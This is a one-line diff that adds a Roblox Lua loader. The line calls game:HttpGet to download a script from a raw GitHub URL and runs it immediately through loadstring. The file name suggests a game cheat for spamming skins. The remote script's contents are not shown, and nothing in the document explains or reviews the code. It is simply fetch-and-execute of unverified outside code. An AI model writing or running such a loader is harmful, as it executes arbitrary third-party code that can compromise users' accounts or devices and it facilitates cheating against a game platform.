@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/clean-crew-class-skins-spam0-76swimulgxwves.lua"))()
